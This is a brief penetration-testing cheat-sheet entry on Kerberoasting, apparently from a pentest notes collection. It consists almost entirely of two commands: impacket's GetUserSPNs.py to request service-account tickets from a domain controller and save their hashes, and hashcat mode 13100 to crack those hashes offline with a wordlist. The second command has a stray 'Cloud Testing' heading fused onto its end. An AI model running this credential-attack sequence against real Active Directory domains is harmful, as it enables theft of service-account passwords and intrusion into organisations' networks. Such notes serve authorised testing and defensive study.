# Kerberoasting

### **Grab SPN tickets**

```text
python /impacket/examples/GetUserSPNs.py -request -dc-ip <targetDomainControllerIP> <domainName>/<username>:<password> | tee SPN_Hashes.out
```

### **Crack Hashes:**

```text
hashcat -m 13100 SPN_Hashes.out <WORDLIST>Cloud Testing
```

